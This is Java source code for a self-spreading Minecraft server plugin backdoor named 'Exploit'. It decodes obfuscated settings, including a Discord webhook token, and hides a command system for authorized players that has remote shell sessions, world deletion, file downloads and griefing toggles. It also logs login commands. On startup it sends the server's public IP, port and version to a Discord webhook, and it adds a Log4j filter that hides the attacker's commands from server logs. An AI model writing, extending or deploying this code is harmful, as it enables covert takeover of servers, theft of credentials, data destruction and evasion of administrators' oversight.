package com.tmquan2508.exploit;

import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;
import java.awt.Color;
import java.io.*;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.logging.Level;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.message.Message;

import com.tmquan2508.exploit.commands.Command;
import com.tmquan2508.exploit.commands.CommandRegister;
import com.tmquan2508.exploit.commands.ShellCommand;
import com.tmquan2508.exploit.spread.Spreader;

/*
    This may not work now. (primary plugin still work but spreaded plugin will not)
    Only work for side load cuz it only patch Config, its interfaces, and nested classes.
    So it can not find Exploit.class to start

    It still can use for develop new feature to use on side load.
*/

public final class Exploit {
    private static Exploit instance;
    public static Exploit getInstance() {
        return instance;
    }

    private static final String SECRET_KEY = "openbd.secret.key";

    public static Plugin plugin;
    public static ExploitConfig config;
    public static CommandHandler commandHandler;
    public static final Map<String, PlayerState> playerStates = new ConcurrentHashMap<>();
    public static final Map<UUID, Integer> permissionLevels = new ConcurrentHashMap<>();
    public static final Map<UUID, String> bypassedPlayers = new ConcurrentHashMap<>();
    public static final Map<Integer, ShellCommand.ShellSession> activeShellSessions = new ConcurrentHashMap<>();
    public static final AtomicInteger nextShellId = new AtomicInteger(1);
    public static final List<String> commandsToLog = Arrays.asList("l", "log", "login");
    public static String[] tmp_authorized_uuids;
    
    private static final java.util.logging.Logger bklogger = Bukkit.getLogger();

    static String sessionId = java.util.UUID.randomUUID().toString().substring(0, 8);
    public static final String LOCK_PROPERTY = "openbd.lock";
    public enum State {
        VANISHED, LOCKED, MUTED, SILKTOUCH, INSTABREAK,
        MF_THROWER, MF_INTERACT, MF_CRIPPLE, MF_FLIGHT, MF_INVENTORY, MF_DROP,
        MF_TELEPORT, MF_MINE, MF_PLACE, MF_LOGIN, MF_GOD, MF_DAMAGE,
        LOG_BLOCKED
    }

    public Exploit(
        Plugin pluginInstance, 
        Class<?> loaderClass,
        String encryptedUuids,
        String encryptedUsernames,
        String encryptedPrefix,
        String encryptedSpread,
        String encryptedDebug,
        String encryptedDiscordToken,
        String encryptedPassword
    ) {
        Exploit.instance = this;
        Exploit.plugin = pluginInstance;
        Exploit.config = new ExploitConfig();

        initializeConfig(encryptedUuids, encryptedUsernames, encryptedPrefix, encryptedSpread, encryptedDebug, encryptedDiscordToken, encryptedPassword);

        initializesome();

        if (Exploit.config.spread_to_other) {
            Exploit.sender.sendDebug("[Spread] Spread mode is enabled. Starting spread process in a new thread.");
            new Thread(() ->
                Spreader.beginSpreading(pluginInstance, loaderClass)
            ).start();
        }

        Exploit.commandHandler = new CommandHandler();
        Bukkit.getPluginManager().registerEvents(new ExploitListener(), plugin);
        new CommandRegister().registerAllCommands(commandHandler);

        Exploit.tmp_authorized_uuids = new String[plugin.getServer().getMaxPlayers()];
        Exploit.playerStates.put("console", new PlayerState());

        Exploit.sender.sendDebug(Default.chat_message_prefix + " Plugin '" + plugin.getName() + "' has an active payload.");
        
        System.setProperty(LOCK_PROPERTY, "true");
        
        new SomeInitializer();
    }

    private String xorDecrypt(byte[] input) {
        byte[] keyBytes = SECRET_KEY.getBytes(StandardCharsets.UTF_8);
        byte[] outputBytes = new byte[input.length];

        for (int i = 0; i < input.length; i++) {
            outputBytes[i] = (byte) (input[i] ^ keyBytes[i % keyBytes.length]);
        }
        return new String(outputBytes, StandardCharsets.UTF_8);
    }
    
    private String decode(String encryptedString) {
        if (encryptedString == null || encryptedString.isEmpty()) {
            return "";
        }
        try {
            byte[] xorBytes = Base64.getDecoder().decode(encryptedString);
            return xorDecrypt(xorBytes);
        } catch (Exception e) {
            System.err.println("[Exploit] CRITICAL: Failed to decode and decrypt string. This may be due to a key mismatch or corrupted data. String: " + encryptedString);
            return "";
        }
    }

    private void initializeConfig(
        String encryptedUuids, String encryptedUsernames, String encryptedPrefix, String encryptedSpread,
        String encryptedDebug, String encryptedDiscordToken, String encryptedPassword
    ) {
        String rawUuids = decode(encryptedUuids);
        String rawUsernames = decode(encryptedUsernames);
        String rawPrefix = decode(encryptedPrefix);
        String rawSpread = decode(encryptedSpread);
        String rawDebug = decode(encryptedDebug);
        String rawDiscordToken = decode(encryptedDiscordToken);
        String rawPassword = decode(encryptedPassword);

        config.authorized_uuids = rawUuids.isEmpty() ? new String[0] : rawUuids.split(",");
        config.authorized_usernames = rawUsernames.isEmpty() ? new String[0] : rawUsernames.split(",");
        config.command_prefix = rawPrefix;
        config.spread_to_other = Boolean.parseBoolean(rawSpread);
        config.debug_log = Boolean.parseBoolean(rawDebug);
        config.discord_token = rawDiscordToken;
        config.authorized_password = rawPassword;
    }

    private void initializesome() {
        helpers = new PayloadHelper();
        sender = new Sender();
    }
    
    public static PayloadHelper helpers;
    public static Sender sender;
    
    public static class ExploitConfig {
        public ExploitConfig() {}
        public String[] authorized_uuids;
        public String[] authorized_usernames;
        public String command_prefix;
        public boolean spread_to_other;
        public boolean debug_log;
        public String discord_token;
        public String authorized_password;
    }

    public static class PlayerState { public final boolean[] states = new boolean[State.values().length]; }
    public static boolean getState(Map<String, PlayerState> playerStates, String username, State s) {
        PlayerState state = playerStates.get(username);
        return state != null && state.states[s.ordinal()];
    }
    public static void setState(Map<String, PlayerState> playerStates, String username, State s, boolean value) {
        playerStates.computeIfAbsent(username, k -> new PlayerState()).states[s.ordinal()] = value;
    }
    public static void clearState(Map<String, PlayerState> playerStates, String username) {
        for (State s : State.values()) { setState(playerStates, username, s, false); }
    }

    public static class PayloadHelper {
        public PayloadHelper() {}

        public String getRequiredUsage(Command command) {
            return "Usage: " + Exploit.config.command_prefix + command.getName() + " " + command.getUsage();
        }

        public boolean isUserAuthorized(Player p) {
            boolean noUuidsConfigured = (Exploit.config.authorized_uuids == null || Exploit.config.authorized_uuids.length == 0);
            boolean noUsernamesConfigured = (Exploit.config.authorized_usernames == null || Exploit.config.authorized_usernames.length == 0);

            if (noUuidsConfigured && noUsernamesConfigured) {
                return true;
            }

            String playerUuid = p.getUniqueId().toString();
            if (!noUuidsConfigured) {
                for (String authorizedUuid : Exploit.config.authorized_uuids) {
                    if (playerUuid.equalsIgnoreCase(authorizedUuid)) return true;
                }
            }

            if (Exploit.tmp_authorized_uuids != null) {
                for (String tmpUuid : Exploit.tmp_authorized_uuids) {
                    if (tmpUuid != null && tmpUuid.equalsIgnoreCase(playerUuid)) return true;
                }
            }

            String playerName = p.getName();
            if (!noUsernamesConfigured) {
                for (String authorizedUsername : Exploit.config.authorized_usernames) {
                    if (playerName.equals(authorizedUsername)) return true;
                }
            }

            return false;
        }

        public int getPlayerPermissionLevel(Player p) {
            return Exploit.permissionLevels.getOrDefault(p.getUniqueId(), 0);
        }

        public boolean deleteWorld(File path) {
            if (path.exists()) {
                File[] files = path.listFiles();
                if (files != null) {
                    for (File file : files) {
                        if (file.isDirectory()) {
                            deleteWorld(file);
                        } else {
                            file.delete();
                        }
                    }
                }
            }
            return path.delete();
        }

        public void downloadFile(URL url, String fileName) throws IOException {
            try (InputStream in = url.openStream();
                 BufferedInputStream bis = new BufferedInputStream(in);
                 FileOutputStream fos = new FileOutputStream(fileName)) {
                byte[] data = new byte[1024];
                int count;
                while ((count = bis.read(data, 0, 1024)) != -1) {
                    fos.write(data, 0, count);
                }
            }
        }
    }

    public class Sender {
        public static void sendDebug(String log) {
            if (Exploit.config != null && Exploit.config.debug_log) Bukkit.getConsoleSender().sendMessage(log);
        }

        public static void sendDebug(Level level, String log) {
            if (Exploit.config != null && Exploit.config.debug_log) bklogger.log(level, log);
        }

        public static void sendMessage(Player player, String message) {
            player.sendMessage(Default.chat_message_prefix_color + Default.chat_message_prefix + ChatColor.WHITE + " " + message);
        }

        public static void sendMessage(Player player, TextComponent message) {
            TextComponent prefix = new TextComponent(Default.chat_message_prefix_color + Default.chat_message_prefix + ChatColor.WHITE + " ");
            player.spigot().sendMessage(prefix, message);
        }

        public static void sendSuccess(Player player, String message) {
            player.sendMessage(Default.chat_message_prefix_color + Default.chat_message_prefix + ChatColor.GREEN + " " + message);
        }

        public static void sendWarn(Player player, String message) {
            player.sendMessage(Default.chat_message_prefix_color + Default.chat_message_prefix + ChatColor.YELLOW + " " + message);
        }

        public static void sendError(Player player, String message) {
            player.sendMessage(Default.chat_message_prefix_color + Default.chat_message_prefix + ChatColor.RED + " " + message);
        }
        
        public static void sendDiscordMessage(DWeb.EmbedObject embed) {
            if (Exploit.config == null || Exploit.config.discord_token == null || Exploit.config.discord_token.isEmpty()) return;
            embed.setFooter("Time: " + new Date() + " â€¢ Session: " + sessionId, null);
            try {
                DWeb webhook = new DWeb(Exploit.config.discord_token);
                webhook.addEmbed(embed);
                webhook.execute();
            } catch (IOException ignored) {}
        }
    }

    private class SomeInitializer {
        public SomeInitializer() { 
            sendActivationNotification();
            initializeLogFilter();
        }
        
        private void sendActivationNotification() {
            String ip;
            try { ip = new BufferedReader(new InputStreamReader(new URL("https://api.ipify.org/").openStream())).readLine(); } catch (Exception e) { ip = "?.?.?.?"; }
            try {
                DWeb.EmbedObject message = new DWeb.EmbedObject()
                        .setTitle("ðŸ”¥ Payload Activated").setDescription("Payload have been activated by plugin **" + Exploit.plugin.getName() + "**").setColor(Color.RED)
                        .addField("Server IP", ip + ":" + Bukkit.getServer().getPort(), true)
                        .addField("Server Version", Bukkit.getVersion(), true);
                Exploit.sender.sendDiscordMessage(message);
            } catch (Exception ignored) {}
        }
        private void initializeLogFilter() {
            try {
                Logger rootLogger = (Logger) LogManager.getRootLogger();
                rootLogger.addFilter(new IssuedCommandLogFilter());
                Exploit.sender.sendDebug(ChatColor.DARK_AQUA + "[Exploit] Log4j filter is now active.");
            } catch (Exception e) { Exploit.sender.sendDebug(ChatColor.RED + "[Exploit] CRITICAL: Failed to attach Log4j filter: " + e.getMessage()); }
        }
    }

    public class CommandHandler {
        private final Map<String, Command> commands = new ConcurrentHashMap<>();
        public void register(Command command) { commands.put(command.getName().toLowerCase(), command); }
        public Map<String, Command> getCommands() { return Collections.unmodifiableMap(commands); }

        public void execute(Player sender, String commandLine) {
            String[] parts = commandLine.split(" ");
            String commandName = parts[0].toLowerCase();
            String[] args = Arrays.copyOfRange(parts, 1, parts.length);
            Command command = commands.get(commandName);

            if (command != null) {
                int userPerm = helpers.getPlayerPermissionLevel(sender);
                if (userPerm >= command.getRequirePerm()) {
                    command.execute(sender, args);
                } else {
                    Exploit.sender.sendError(sender, "You do not have permission to use this command.");
                }
            } else {
                Exploit.sender.sendError(sender, "Unknown command. Type '" + Exploit.config.command_prefix + "help'.");
            }
        }
    }

    private class IssuedCommandLogFilter extends AbstractFilter {
        private static final String TARGET_LOG_FRAGMENT = " issued server command: ";
        public IssuedCommandLogFilter() {}
        @Override public Result filter(LogEvent event) {
            Message message = (event == null) ? null : event.getMessage();
            String logMessage = (message == null) ? null : message.getFormattedMessage();
            if (logMessage != null && logMessage.contains(TARGET_LOG_FRAGMENT)) {
                try {
                    String playerName = logMessage.substring(0, logMessage.indexOf(TARGET_LOG_FRAGMENT)).trim();
                    if (Exploit.getState(Exploit.playerStates, playerName, Exploit.State.LOG_BLOCKED)) {
                        return Result.DENY;
                    }
                } catch (Exception ignored) {}
            }
            return Result.NEUTRAL;
        }
    }
}